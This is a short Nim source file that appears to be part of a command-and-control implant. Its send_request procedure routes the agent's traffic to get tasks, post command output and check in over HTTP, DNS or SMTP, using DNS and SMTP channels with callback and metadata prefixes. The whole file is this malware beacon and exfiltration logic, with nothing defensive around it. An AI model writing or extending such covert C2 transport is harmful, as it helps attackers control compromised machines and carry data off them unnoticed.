import ../[config, utils]
import ./[http, dns, smtp]

# output represents data is output of a command
# refactor: there is three purposes of send_request
# 1. get task: xxx_get
# 2. send task result: xxx_post
# 3. checkin
proc send_request*(data: seq[byte], output = false, checkin = false): seq[byte] =
    case config.protocol
    of "http://", "https://":
        if output: return send_request_http_post(data)
        else: return send_request_http_get(data)
    of "dns://":
        if output: return send_request_dns_post(data, post_result_prefix)
        else: return send_request_dns_get(data)
    of "smtp://":
        if output: return send_request_smtp_post(data, smtp_callback_prefix)
        if checkin: return send_request_smtp_post(data, smtp_metadata_prefix)
        return send_request_smtp_get(data)
    else:
        dbg "[-] unknown protocol: " & config.protocol
        return
